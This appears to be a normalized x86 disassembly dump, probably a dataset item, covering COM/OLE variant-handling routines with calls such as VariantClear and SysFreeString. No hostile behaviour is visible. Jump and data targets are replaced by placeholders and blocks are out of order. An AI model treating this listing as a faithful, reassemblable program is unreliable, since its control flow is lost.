mov [ ebp - 0x3c ] eax
mov [ esi + 0xa0 ] eax
mov eax [ esi + 0x4c ]
test eax eax
je r-xdata
mov eax [ ebp - 0x20 ]
mov ecx [ ebp - 0x18 ]
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x1c ]
push edx
lea edx [ ebp - 0x78 ]
push edx
lea edx [ ebp - 0x48 ]
mov ecx [ eax ]
push 0x0
push edx
push 0x4
push 0x0
push r--data
push [ esi + 0x94 ]
push eax
call [ ecx + 0x18 ]
mov eax [ ebp - 0x1c ]
push eax
mov ecx [ eax ]
call [ ecx + 0x8 ]
and [ esi + 0xa0 ] 0x0
cmp [ ebp - 0x74 ] 0x0
je r-xdata
cmp [ ebp - 0x70 ] 0x0
je r-xdata
push [ ebp - 0x74 ]
call [ SysFreeString@IAT ]
cmp [ ebp - 0x6c ] 0x0
je r-xdata
push [ ebp - 0x70 ]
call [ SysFreeString@IAT ]
lea eax [ ebp - 0x38 ]
push eax
call ebx
inc [ ebp - 0x10 ]
add [ ebp - 0x14 ] 0x10
push [ ebp - 0x6c ]
call [ SysFreeString@IAT ]
sub_40e193
mov eax sub_42b2ef
call sub_410a78
sub esp 0xb4
push ebx
push esi
push edi
mov ebx ecx
xor edi edi
cmp [ ebx + 0x48 ] edi
mov [ ebp - 0x40 ] edi
mov [ ebp - 0x18 ] edi
je r-xdata
cmp [ ebx + 0xc ] edi
lea ecx [ ebx + 0xc ]
jne r-xdata
cmp [ ebx + 0x54 ] edi
je r-xdata
cmp [ ebx + 0x10 ] edi
mov [ ebp - 0x20 ] edi
jle r-xdata
mov eax [ ebx + 0x8 ]
push ecx
push r--data
push eax
mov edx [ eax ]
call [ edx ]
cmp eax edi
jl r-xdata
xor eax eax
push 0x1
pop esi
cmp [ ebx + 0x10 ] esi
mov [ ebp - 0x34 ] esi
jl r-xdata
mov eax [ ebx + 0x1c ]
cmp eax edi
mov [ ebp - 0x1c ] eax
je r-xdata
mov [ ebp - 0x34 ] edi
mov [ ebp - 0x20 ] 0x30
mov [ ebp - 0x1c ] 0x28
cmp [ ebp - 0x18 ] edi
jle r-xdata
mov eax [ ebp - 0x1c ]
mov esi [ eax + 0x8 ]
mov ecx [ eax ]
mov [ ebp - 0x1c ] ecx
mov eax [ esi ]
mov eax [ eax + 0x4c ]
cmp eax edi
je r-xdata
inc [ ebp - 0x20 ]
add [ ebp - 0x34 ] 0x28
mov eax [ ebp - 0x20 ]
cmp eax [ ebx + 0x10 ]
jl r-xdata
mov edx [ ebp - 0x40 ]
lea edx [ edx + edx * 2 ]
shl edx 0x4
mov [ ebp - 0x1c ] edx
add [ ebp - 0x1c ] 0x28
add [ ebp - 0x20 ] 0x30
inc esi
cmp esi [ ebx + 0x10 ]
mov [ ebp - 0x34 ] esi
jle r-xdata
mov ecx eax
mov eax [ eax ]
mov [ ebp - 0x44 ] eax
mov ecx [ ecx + 0x8 ]
cmp [ ecx + 0xa4 ] edi
lea edx [ ecx + 0xa4 ]
je r-xdata
mov eax [ ebx + 0xc ]
push edi
push edi
push edi
mov ecx [ eax ]
push eax
call [ ecx + 0x1c ]
mov esi eax
mov [ ebx + 0x44 ] edi
cmp esi edi
jge r-xdata
cmp [ ebp - 0x1c ] edi
jne r-xdata
mov ecx [ eax ]
lea edx [ ebp - 0x10 ]
push edx
push r--data
push eax
call [ ecx ]
test eax eax
jl r-xdata
mov eax [ ebx + 0x14 ]
mov ecx [ ebp - 0x34 ]
mov eax [ ecx + eax + 0x24 ]
mov eax [ eax + 0x4 ]
cmp eax edi
je r-xdata
inc [ ebp - 0x40 ]
add edx 0x30
cmp eax edi
mov [ ebp - 0x1c ] edx
jne r-xdata
inc [ ebp - 0x18 ]
push 0x1
pop esi
mov [ ecx ] edi
cmp [ ebp - 0x18 ] esi
jne r-xdata
mov eax [ ebx + 0x14 ]
mov ecx [ ebp - 0x1c ]
mov eax [ ecx + eax - 0x4 ]
mov eax [ eax + 0x4 ]
cmp [ ebp - 0x18 ] edi
jle r-xdata
inc [ ebp - 0x40 ]
jmp r-xdata
inc [ ebp - 0x18 ]
push 0x1
pop eax
mov [ edx ] edi
cmp [ ebp - 0x18 ] eax
jne r-xdata
mov eax [ ebx ]
mov ecx ebx
call [ eax + 0x10 ]
mov eax esi
jmp r-xdata
mov eax [ ebp - 0x10 ]
push [ esi + 0x8 ]
mov ecx [ eax ]
push eax
call [ ecx + 0x10 ]
test eax eax
jne r-xdata
mov ecx eax
mov eax [ eax ]
mov [ ebp - 0x3c ] eax
mov ecx [ ecx + 0x8 ]
mov [ ebp - 0x10 ] ecx
add ecx 0xa4
cmp [ ecx ] edi
je r-xdata
push 0x10
lea eax [ ebp - 0x58 ]
pop esi
push eax
call sub_40ff70
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x4 ] 0x2
lea ecx [ eax + 0xa8 ]
mov [ ebp - 0x48 ] ecx
movzx eax [ ecx ]
cmp eax edi
jl r-xdata
mov eax [ ebx + 0xc ]
lea edx [ ebp - 0x44 ]
push edx
push eax
mov ecx [ eax ]
call [ ecx + 0x18 ]
cmp eax edi
jl r-xdata
mov [ ebx + 0x44 ] edi
cmp eax edi
je r-xdata
lea eax [ ecx + 0xa8 ]
lea ecx [ ebp - 0x30 ]
push eax
mov [ ebp - 0x48 ] eax
call sub_40fe18
mov [ ebp - 0x4 ] edi
mov [ ebp - 0xb0 ] edi
mov [ ebp - 0xac ] edi
mov [ ebp - 0xa8 ] edi
mov [ ebp - 0xa4 ] edi
mov [ ebp - 0x94 ] edi
mov [ ebp - 0x8c ] edi
mov [ ebp - 0xa0 ] edi
mov ecx [ ebx + 0x54 ]
lea eax [ ebp - 0x10 ]
push eax
mov [ ebp - 0x4 ] 0x1
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x10 ] esi
call sub_40d585
test al al
je r-xdata
mov [ ebx + 0x44 ] eax
mov ecx [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov [ fs : 0x0 ] ecx
leave
retn
mov eax [ ebp - 0x10 ]
push eax
mov ecx [ eax ]
call [ ecx + 0x8 ]
inc [ ebp - 0x18 ]
push 0x1
pop esi
cmp [ ebp - 0x18 ] esi
jne r-xdata
push ecx
lea ecx [ ebp - 0x58 ]
call sub_40ff56
cmp eax 0x1
jle r-xdata
cmp [ ebp - 0x44 ] esi
jne r-xdata
xor eax eax
mov eax [ ebp - 0x10 ]
mov ecx [ ebp - 0x14 ]
mov edx [ ecx + 0x10 ]
lea eax [ eax + eax * 2 ]
shl eax 0x4
mov eax [ eax + edx + 0x4 ]
add eax [ ecx + 0x8 ]
jmp r-xdata
mov eax [ ebx + 0xc ]
lea edx [ ebp - 0x3c ]
push edx
push eax
mov ecx [ eax ]
call [ ecx + 0x18 ]
cmp eax edi
jl r-xdata
or esi 0xffffffff
cmp eax 0x8
je r-xdata
mov [ ebx + 0x44 ] esi
mov eax [ ebx + 0xc ]
push esi
push eax
mov ecx [ eax ]
call [ ecx + 0xc ]
cmp eax edi
jl r-xdata
xor ecx ecx
mov eax [ ebp - 0x10 ]
lea ecx [ eax + eax * 2 ]
mov eax [ ebp - 0x14 ]
shl ecx 0x4
mov edx [ eax + 0x10 ]
mov ecx [ ecx + edx + 0x4 ]
add ecx [ eax + 0x8 ]
jmp r-xdata
mov ecx [ ebx + 0x54 ]
mov edx [ ebp - 0x20 ]
mov ecx [ ecx + 0x10 ]
push [ ecx + edx + 0x10 ]
lea ecx [ ebp - 0xb0 ]
push eax
push 0x1
call sub_40eb44
mov ecx [ ebx + 0x54 ]
lea eax [ ebp - 0x10 ]
push eax
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x10 ] esi
call sub_40d585
test al al
je r-xdata
cmp [ ebp - 0x3c ] esi
jne r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0xb0 ]
cmp [ eax ] di
jne r-xdata
cmp eax 0xa
je r-xdata
movzx eax [ ebp - 0x3c ]
mov ecx 0x81
cmp eax ecx
jg r-xdata
mov eax [ ebp - 0x10 ]
mov ecx [ ebp - 0x14 ]
mov ecx [ ecx + 0x10 ]
lea eax [ eax + eax * 2 ]
shl eax 0x4
mov ax [ eax + ecx + 0x14 ]
mov [ ebp - 0x3c ] ax
mov eax [ ebx + 0x54 ]
mov edx [ ebp - 0x20 ]
push edi
push edi
mov eax [ eax + 0x10 ]
push ecx
add eax edx
push [ eax + 0x10 ]
mov cx [ eax + 0x14 ]
push ecx
lea ecx [ ebp - 0xb0 ]
push [ eax + 0x8 ]
call sub_40ebbb
mov eax [ ebx + 0x50 ]
lea ecx [ ebp - 0xb0 ]
push [ eax ]
call sub_40ec0f
mov ecx [ ebx + 0x54 ]
lea eax [ ebp - 0x10 ]
push eax
mov [ ebp - 0x10 ] esi
mov [ ebp - 0x14 ] ecx
call sub_40d585
test al al
je r-xdata
mov [ ebx + 0x44 ] esi
mov eax [ ebx + 0xc ]
push esi
push eax
mov ecx [ eax ]
call [ ecx + 0xc ]
cmp eax edi
jl r-xdata
or esi 0xffffffff
jmp r-xdata
jmp r-xdata
sub eax 0x82
je r-xdata
je r-xdata
mov eax [ ebx + 0x3c ]
mov ecx [ ebp - 0x1c ]
add eax ecx
mov [ ebp - 0x80 ] edi
mov [ ebp - 0x7c ] 0x1
mov ecx [ eax + 0x2c ]
mov [ ebp - 0x70 ] esi
mov [ ebp - 0x78 ] ecx
lea ecx [ ebp - 0x58 ]
mov [ ebp - 0x6c ] ecx
mov ecx [ ebx + 0xc ]
lea esi [ ebp - 0x80 ]
mov [ ebp - 0x74 ] edi
mov edx [ ecx ]
push esi
push eax
push ecx
call [ edx + 0x10 ]
push [ ebp - 0x48 ]
mov esi [ VariantClear@IAT ]
call esi
or [ ebp - 0x4 ] 0xffffffff
lea eax [ ebp - 0x58 ]
push eax
call esi
mov eax [ ebp - 0x3c ]
mov edx [ ebp - 0x1c ]
push edi
push 0x8
lea ecx [ ebp - 0x30 ]
call sub_40ff2b
mov ecx [ ebx + 0x54 ]
lea eax [ ebp - 0x10 ]
push eax
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x10 ] esi
call sub_40d585
test al al
je r-xdata
sub eax 0x5
jne r-xdata
push edi
push 0x8
lea ecx [ ebp - 0x30 ]
call sub_40ff2b
mov ecx [ ebx + 0x54 ]
lea eax [ ebp - 0x10 ]
push eax
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x10 ] esi
call sub_40d585
test al al
je r-xdata
cmp eax 0x8
jg r-xdata
xor eax eax
mov eax [ ebp - 0x10 ]
mov ecx [ ebp - 0x14 ]
mov edx [ ecx + 0x10 ]
lea eax [ eax + eax * 2 ]
shl eax 0x4
mov eax [ eax + edx + 0x4 ]
add eax [ ecx + 0x8 ]
jmp r-xdata
mov eax [ ebx + 0x50 ]
lea ecx [ ebp - 0xb0 ]
mov [ eax + 0x8 ] ecx
mov ecx [ ebx + 0x50 ]
call sub_40ead6
mov ecx [ ebx + 0x50 ]
mov eax [ ebx + 0x54 ]
push [ ebp - 0x48 ]
mov [ ecx + 0x8 ] eax
call [ VariantClear@IAT ]
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0xb0 ]
call sub_40eb2d
or [ ebp - 0x4 ] 0xffffffff
lea eax [ ebp - 0x30 ]
push eax
call [ VariantClear@IAT ]
mov eax [ ebp - 0x44 ]
push edi
push 0x7
lea ecx [ ebp - 0x30 ]
call sub_40ff2b
push 0x10
lea eax [ ebp - 0x68 ]
push edi
push eax
call sub_410a20
fld [ ebp - 0x28 ]
add esp 0xc
lea eax [ ebp - 0x58 ]
push eax
push ecx
push ecx
fstp [ esp ]
call [ VariantTimeToSystemTime@IAT ]
mov ax [ ebp - 0x58 ]
mov ecx 0xf4240
mov [ ebp - 0x68 ] ax
mov ax [ ebp - 0x56 ]
mov [ ebp - 0x66 ] ax
mov ax [ ebp - 0x52 ]
mov [ ebp - 0x64 ] ax
mov ax [ ebp - 0x50 ]
mov [ ebp - 0x62 ] ax
mov ax [ ebp - 0x4e ]
mov [ ebp - 0x60 ] ax
mov ax [ ebp - 0x4c ]
mov [ ebp - 0x5e ] ax
mov [ ebp - 0x10 ] esi
movzx eax [ ebp - 0x4a ]
cdq
idiv ecx
mov ecx [ ebx + 0x54 ]
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x5c ] eax
lea eax [ ebp - 0x10 ]
push eax
call sub_40d585
test al al
je r-xdata
xor eax eax
mov eax [ ebp - 0x10 ]
mov ecx [ ebp - 0x14 ]
mov edx [ ecx + 0x10 ]
lea eax [ eax + eax * 2 ]
shl eax 0x4
mov eax [ eax + edx + 0x4 ]
add eax [ ecx + 0x8 ]
jmp r-xdata
sub eax 0xb
je r-xdata
je r-xdata
mov ecx [ ebx + 0x54 ]
mov edx [ ebp - 0x20 ]
mov ecx [ ecx + 0x10 ]
push [ ecx + edx + 0x10 ]
push [ ebp - 0x28 ]
push eax
call sub_412470
add esp 0xc
lea esi [ ebp - 0x68 ]
lea edi [ ebp - 0x78 ]
mov eax [ ebp - 0x10 ]
mov ecx [ ebp - 0x14 ]
movsd [ edi ] [ esi ]
mov edx [ ecx + 0x10 ]
lea eax [ eax + eax * 2 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
shl eax 0x4
movsd [ edi ] [ esi ]
mov eax [ eax + edx + 0x4 ]
lea esi [ ebp - 0x78 ]
add eax [ ecx + 0x8 ]
mov ecx [ ebx + 0x54 ]
mov edx [ ebp - 0x20 ]
push edi
push edi
mov ecx [ ecx + 0x10 ]
push [ ecx + edx + 0x10 ]
push eax
push 0xffffffff
push [ ebp - 0x28 ]
push edi
push edi
call [ WideCharToMultiByte@IAT ]
jmp r-xdata
push edi
push 0xb
lea ecx [ ebp - 0x30 ]
call sub_40ff2b
mov ecx [ ebx + 0x54 ]
lea eax [ ebp - 0x10 ]
push eax
mov [ ebp - 0x10 ] esi
mov [ ebp - 0x14 ] ecx
call sub_40d585
test al al
je r-xdata
sub eax 0x3
je r-xdata
dec eax
dec eax
je r-xdata
mov eax [ ebp - 0x10 ]
mov ecx [ ebp - 0x14 ]
lea eax [ eax + eax * 2 ]
shl eax 0x4
jmp r-xdata
push edi
push 0xe
lea ecx [ ebp - 0x30 ]
call sub_40ff2b
mov ecx [ ebx + 0x54 ]
lea eax [ ebp - 0x10 ]
push eax
mov [ ebp - 0x10 ] esi
mov [ ebp - 0x14 ] ecx
call sub_40d585
test al al
je r-xdata
dec eax
dec eax
je r-xdata
push edi
push 0x2
lea ecx [ ebp - 0x30 ]
call sub_40ff2b
mov ecx [ ebx + 0x54 ]
lea eax [ ebp - 0x10 ]
push eax
mov [ ebp - 0x10 ] esi
mov [ ebp - 0x14 ] ecx
call sub_40d585
test al al
je r-xdata
dec eax
je r-xdata
mov edx [ ecx + 0x10 ]
mov eax [ eax + edx + 0x4 ]
add eax [ ecx + 0x8 ]
mov cx [ ebp - 0x28 ]
mov [ eax ] cx
jmp r-xdata
lea esi [ ebp - 0x30 ]
lea edi [ ebp - 0xc0 ]
mov eax [ ebp - 0x10 ]
mov ecx [ ebp - 0x14 ]
movsd [ edi ] [ esi ]
mov edx [ ecx + 0x10 ]
lea eax [ eax + eax * 2 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
shl eax 0x4
movsd [ edi ] [ esi ]
mov eax [ eax + edx + 0x4 ]
lea esi [ ebp - 0xc0 ]
add eax [ ecx + 0x8 ]
jmp r-xdata
push edi
push 0x10
lea ecx [ ebp - 0x30 ]
call sub_40ff2b
mov al [ ebp - 0x28 ]
mov ecx [ ebx + 0x54 ]
mov [ ebp - 0x35 ] al
lea eax [ ebp - 0x10 ]
push eax
mov [ ebp - 0x10 ] esi
mov [ ebp - 0x14 ] ecx
call sub_40d585
test al al
je r-xdata
dec eax
je r-xdata
mov eax [ ebp - 0x10 ]
mov ecx [ ebp - 0x14 ]
lea eax [ eax + eax * 2 ]
shl eax 0x4
jmp r-xdata
push edi
push 0x3
lea ecx [ ebp - 0x30 ]
call sub_40ff2b
mov ecx [ ebx + 0x54 ]
lea eax [ ebp - 0x10 ]
push eax
mov [ ebp - 0x10 ] esi
mov [ ebp - 0x14 ] ecx
call sub_40d585
test al al
je r-xdata
dec eax
je r-xdata
mov edi eax
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi [ ebp - 0x34 ]
xor edi edi
jmp r-xdata
mov eax [ ebp - 0x10 ]
mov ecx [ ebp - 0x14 ]
mov edx [ ecx + 0x10 ]
lea eax [ eax + eax * 2 ]
shl eax 0x4
mov eax [ eax + edx + 0x4 ]
add eax [ ecx + 0x8 ]
mov cl [ ebp - 0x35 ]
push edi
push 0x11
lea ecx [ ebp - 0x30 ]
call sub_40ff2b
mov ecx [ ebx + 0x54 ]
lea eax [ ebp - 0x10 ]
push eax
mov [ ebp - 0x10 ] esi
mov [ ebp - 0x14 ] ecx
call sub_40d585
test al al
je r-xdata
dec eax
je r-xdata
mov eax [ ebp - 0x10 ]
mov ecx [ ebp - 0x14 ]
lea eax [ eax + eax * 2 ]
shl eax 0x4
jmp r-xdata
push edi
push 0x4
lea ecx [ ebp - 0x30 ]
call sub_40ff2b
mov ecx [ ebx + 0x54 ]
lea eax [ ebp - 0x10 ]
push eax
mov [ ebp - 0x10 ] esi
mov [ ebp - 0x14 ] ecx
call sub_40d585
test al al
je r-xdata
dec eax
je r-xdata
mov eax [ ebp - 0x10 ]
mov ecx [ ebp - 0x14 ]
mov edx [ ecx + 0x10 ]
lea eax [ eax + eax * 2 ]
shl eax 0x4
mov eax [ eax + edx + 0x4 ]
add eax [ ecx + 0x8 ]
mov cl [ ebp - 0x28 ]
jmp r-xdata
push edi
push 0x12
lea ecx [ ebp - 0x30 ]
call sub_40ff2b
mov ecx [ ebx + 0x54 ]
lea eax [ ebp - 0x10 ]
push eax
mov [ ebp - 0x10 ] esi
mov [ ebp - 0x14 ] ecx
call sub_40d585
test al al
je r-xdata
dec eax
jne r-xdata
mov edx [ ecx + 0x10 ]
mov eax [ eax + edx + 0x4 ]
add eax [ ecx + 0x8 ]
mov ecx [ ebp - 0x28 ]
mov [ eax ] ecx
jmp r-xdata
mov eax [ ebp - 0x10 ]
mov ecx [ ebp - 0x14 ]
lea eax [ eax + eax * 2 ]
shl eax 0x4
jmp r-xdata
push edi
push 0x5
lea ecx [ ebp - 0x30 ]
call sub_40ff2b
mov ecx [ ebx + 0x54 ]
lea eax [ ebp - 0x10 ]
push eax
mov [ ebp - 0x10 ] esi
mov [ ebp - 0x14 ] ecx
call sub_40d585
test al al
je r-xdata
dec eax
je r-xdata
mov [ eax ] cl
jmp r-xdata
mov eax [ ebp - 0x10 ]
mov ecx [ ebp - 0x14 ]
lea eax [ eax + eax * 2 ]
shl eax 0x4
push edi
push 0x13
lea ecx [ ebp - 0x30 ]
call sub_40ff2b
mov ecx [ ebx + 0x54 ]
lea eax [ ebp - 0x10 ]
push eax
mov [ ebp - 0x10 ] esi
mov [ ebp - 0x14 ] ecx
call sub_40d585
test al al
je r-xdata
mov eax [ ebp - 0x10 ]
mov ecx [ ebp - 0x14 ]
lea eax [ eax + eax * 2 ]
shl eax 0x4
jmp r-xdata
push edi
push 0x6
lea ecx [ ebp - 0x30 ]
call sub_40ff2b
mov ecx [ ebx + 0x54 ]
lea eax [ ebp - 0x10 ]
push eax
mov [ ebp - 0x10 ] esi
mov [ ebp - 0x14 ] ecx
call sub_40d585
test al al
je r-xdata
dec eax
jne r-xdata
mov eax [ ebp - 0x10 ]
mov ecx [ ebp - 0x14 ]
lea eax [ eax + eax * 2 ]
shl eax 0x4
mov edx [ ecx + 0x10 ]
fld [ ebp - 0x28 ]
mov eax [ eax + edx + 0x4 ]
add eax [ ecx + 0x8 ]
fstp [ eax ]
jmp r-xdata
xor eax eax
mov eax [ ebp - 0x10 ]
mov ecx [ ebp - 0x14 ]
mov edx [ ecx + 0x10 ]
lea eax [ eax + eax * 2 ]
shl eax 0x4
mov eax [ eax + edx + 0x4 ]
add eax [ ecx + 0x8 ]
jmp r-xdata
push edi
push 0x7
lea ecx [ ebp - 0x30 ]
call sub_40ff2b
mov ecx [ ebx + 0x54 ]
lea eax [ ebp - 0x10 ]
push eax
mov [ ebp - 0x10 ] esi
mov [ ebp - 0x14 ] ecx
call sub_40d585
test al al
je r-xdata
mov ecx [ ebp - 0x28 ]
mov [ eax ] ecx
mov ecx [ ebp - 0x24 ]
mov [ eax + 0x4 ] ecx
jmp r-xdata
mov eax [ ebp - 0x10 ]
mov ecx [ ebp - 0x14 ]
lea eax [ eax + eax * 2 ]
shl eax 0x4
sub_40ead6
push ebx
push esi
mov esi ecx
push edi
xor eax eax
xor ebx ebx
mov ecx [ esi + 0x8 ]
mov edi [ ecx + 0x4 ]
test edi edi
jbe r-xdata
pop edi
pop esi
pop ebx
retn
push ebx
mov ecx esi
call sub_40eafe
test eax eax
jl r-xdata
inc ebx
cmp ebx edi
jb r-xdata
sub_40eafe
mov edx [ ecx + 0x4 ]
test edx edx
je r-xdata
mov eax 0x80004002
mov eax [ ecx + 0x8 ]
push esi
push edi
mov edi [ esp + 0xc ]
mov esi [ eax + 0x8 ]
mov eax [ eax ]
push esi
mov eax [ eax + edi * 8 ]
mov edi [ edx ]
push eax
push [ ecx + 0xc ]
push edx
call [ edi + 0x10 ]
pop edi
pop esi
jmp r-xdata
retn 0x4
sub_40eb44
mov eax sub_42b2fc
call sub_410a78
push ecx
push ecx
mov eax [ ebp + 0xc ]
push ebx
push esi
mov esi ecx
push edi
mov edi [ ebp + 0x8 ]
mov [ ebp - 0x10 ] esp
push [ esi + 0xc ]
mov [ esi + 0x8 ] eax
mov eax [ ebp + 0x10 ]
xor ebx ebx
mov [ ebp - 0x14 ] esi
mov [ esi + 0x18 ] eax
mov [ esi + 0x10 ] edi
mov [ esi + 0x14 ] ebx
call sub_4221e2
imul edi edi 0x34
push edi
mov [ esi + 0xc ] ebx
mov [ ebp - 0x4 ] ebx
call sub_4221b9
pop ecx
mov [ esi + 0xc ] eax
pop ecx
jmp r-xdata
mov eax [ esi + 0xc ]
mov ecx [ ebp - 0xc ]
neg eax
sbb eax eax
pop edi
and eax 0x7ff8fff2
pop esi
add eax 0x8007000e
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn 0xc
sub_40ebbb
push ebp
mov ebp esp
mov eax [ ebp + 0x1c ]
xor edx edx
push esi
cmp eax edx
mov esi ecx
je r-xdata
xor eax eax
sub eax [ esi + 0x8 ]
jmp r-xdata
xor ecx ecx
sub ecx [ esi + 0x8 ]
jmp r-xdata
mov ecx [ ebp + 0x18 ]
cmp ecx edx
je r-xdata
push edx
push eax
mov eax [ ebp + 0x14 ]
push ecx
sub eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x14 ]
imul eax eax 0x34
push edx
push edx
push edx
add eax [ esi + 0xc ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push eax
call sub_40d35e
add esp 0x2c
inc [ esi + 0x14 ]
pop esi
pop ebp
retn 0x18
sub_40ec0f
mov eax sub_42b310
call sub_410a78
push ecx
and [ ebp - 0x10 ] 0x0
push ebx
push esi
mov esi ecx
mov eax [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
lea edx [ ebp - 0x10 ]
mov ecx [ eax ]
push edx
push rw-data
push eax
call [ ecx ]
mov ebx eax
test ebx ebx
jl r-xdata
mov eax [ ebp - 0x10 ]
or [ ebp - 0x4 ] 0xffffffff
test eax eax
je r-xdata
cmp [ esi ] 0x0
jne r-xdata
mov eax ebx
jmp r-xdata
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
push [ ebp - 0x10 ]
push [ esi + 0x18 ]
push [ esi ]
push [ esi + 0x10 ]
push [ esi + 0xc ]
call sub_40d314
or [ ebp - 0x4 ] 0xffffffff
mov esi eax
mov eax [ ebp - 0x10 ]
add esp 0x14
test eax eax
je r-xdata
push 0x1
mov ecx esi
call sub_40d2b8
mov ebx eax
test ebx ebx
jge r-xdata
mov ecx [ ebp - 0xc ]
pop esi
pop ebx
mov [ fs : 0x0 ] ecx
leave
retn 0x4
mov eax esi
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
mov eax [ esi ]
mov [ eax + 0x4 ] 0x1
sub_40ecee
push ebp
mov ebp esp
push ecx
push esi
mov esi ecx
cmp [ esi + 0x8 ] 0x80010001
je r-xdata
pop esi
leave
retn
mov eax [ esi ]
test eax eax
je r-xdata
mov eax [ eax + 0x4c ]
lea edx [ ebp - 0x4 ]
push edx
push r--data
mov ecx [ eax ]
push eax
call [ ecx ]
test eax eax
jl r-xdata
mov ecx esi
call sub_40ed71
test eax eax
je r-xdata
lea edx [ esi + 0x10 ]
mov eax [ ebp - 0x4 ]
push edx
xor edx edx
cmp [ esi + 0xc ] edx
mov ecx [ eax ]
setne dl
push edx
push [ esi + 0x8 ]
push eax
call [ ecx + 0xc ]
mov eax [ ebp - 0x4 ]
push eax
mov ecx [ eax ]
call [ ecx + 0x8 ]
jmp r-xdata
mov ecx [ esi + 0xc ]
push 0xd
pop edx
cmp [ ecx + 0x88 ] 0x0
je r-xdata
mov ecx [ esi ]
push edi
push eax
push edx
push [ esi + 0x8 ]
mov edi [ ecx ]
push ecx
call [ edi + 0x68 ]
add esp 0x10
pop edi
mov edx 0x800d
sub_40ed71
push esi
mov esi ecx
mov ecx [ esi + 0xc ]
test ecx ecx
jne r-xdata
mov eax [ ecx ]
call [ eax + 0xb0 ]
mov eax [ esi + 0xc ]
push 0x1
push esi
mov ecx [ eax + 0x88 ]
mov eax [ ecx ]
call [ eax + 0x4 ]
mov eax [ esi + 0xc ]
mov ecx [ eax + 0x88 ]
mov eax [ ecx ]
call [ eax ]
pop esi
retn
xor eax eax
pop esi
retn
sub_40eda7
mov eax [ esp + 0xc ]
test eax eax
je r-xdata
mov ecx [ ecx + 0x8c ]
and [ eax ] 0x0
xor eax eax
retn 0xc
mov eax [ ecx + 0x8 ]
cmp eax [ esp + 0x4 ]
je r-xdata
call sub_40ed71
mov ecx [ esp + 0x8 ]
mov [ ecx ] eax
call sub_40ecea
mov ecx eax
jmp r-xdata
test ecx ecx
je r-xdata
sub_40ee3a
push 0x10
push r--data
push [ esp + 0x10 ]
call sub_410ae0
add esp 0xc
test eax eax
je r-xdata
mov ecx [ esp + 0xc ]
mov eax [ esp + 0x4 ]
push eax
mov [ ecx ] eax
mov ecx [ eax ]
call [ ecx + 0x4 ]
xor eax eax
push 0x10
push r--data
push [ esp + 0x10 ]
call sub_410ae0
add esp 0xc
test eax eax
je r-xdata
mov eax 0x80004002
jmp r-xdata
retn 0xc
sub_40ee84
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x14 ]
push edi
mov edi [ ebp + 0x8 ]
push 0x1
push esi
push [ ebp + 0x10 ]
mov ecx edi
push [ ebp + 0xc ]
call sub_40f041
test eax eax
jl r-xdata
pop edi
pop esi
pop ebp
retn 0x10
mov esi [ esi ]
cmp esi 0x1e
je r-xdata
xor eax eax
cmp esi 0x2
je r-xdata
cmp esi 0x3
je r-xdata
mov eax [ ebp + 0xc ]
and eax 0x1
jne r-xdata
mov ecx [ edi - 0x4c ]
test ecx ecx
je r-xdata
cmp esi 0x1
je r-xdata
test eax eax
je r-xdata
cmp esi 0x14
jne r-xdata
mov eax [ ecx ]
call [ eax + 0x14 ]
jmp r-xdata
sub_40ef00
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x14 ]
push edi
mov edi [ ebp + 0x8 ]
push 0x3
push esi
push [ ebp + 0x10 ]
mov ecx edi
push [ ebp + 0xc ]
call sub_40f041
test eax eax
jl r-xdata
pop edi
pop esi
pop ebp
retn 0x10
mov esi [ esi ]
cmp esi 0x2
je r-xdata
mov ecx [ edi - 0x4c ]
test ecx ecx
je r-xdata
cmp esi 0x3
je r-xdata
xor eax eax
test [ ebp + 0xc ] 0x80
je r-xdata
cmp esi 0x14
jne r-xdata
mov eax [ ecx ]
call [ eax + 0x14 ]
sub_40ef8a
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x14 ]
push edi
mov edi [ ebp + 0x8 ]
push 0x6
push esi
push [ ebp + 0x10 ]
mov ecx edi
push [ ebp + 0xc ]
call sub_40f041
test eax eax
jl r-xdata
pop edi
pop esi
pop ebp
retn 0x10
mov eax [ esi ]
mov esi [ edi - 0x4c ]
test esi esi
je r-xdata
xor eax eax
cmp [ esi + 0x44 ] 0x0
jne r-xdata
cmp eax 0x1f
je r-xdata
cmp eax 0x1e
je r-xdata
test [ ebp + 0xc ] 0x3
je r-xdata
cmp eax 0x2
je r-xdata
cmp eax 0x3
je r-xdata
mov ecx esi
mov [ esi + 0x44 ] 0x1
call sub_40d7ca
mov eax [ esi ]
and [ esi + 0x44 ] 0x0
mov ecx esi
call [ eax + 0x10 ]
sub_40eff3
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push 0x7
mov ecx esi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call sub_40f041
test eax eax
jl r-xdata
pop esi
pop ebp
retn 0x10
mov esi [ esi - 0x4c ]
test esi esi
je r-xdata
xor eax eax
test [ ebp + 0xc ] 0x80
je r-xdata
push edi
mov edi [ esi + 0x44 ]
mov ecx esi
mov [ esi + 0x44 ] 0x1
call sub_40d7ca
mov eax [ esi ]
mov ecx esi
mov [ esi + 0x44 ] edi
call [ eax + 0x10 ]
pop edi
sub_40f041
push ebp
mov ebp esp
sub esp 0x24
test [ ebp + 0x8 ] 0x3
push esi
push edi
lea edi [ ecx - 0xd4 ]
je r-xdata
xor eax eax
xor edx edx
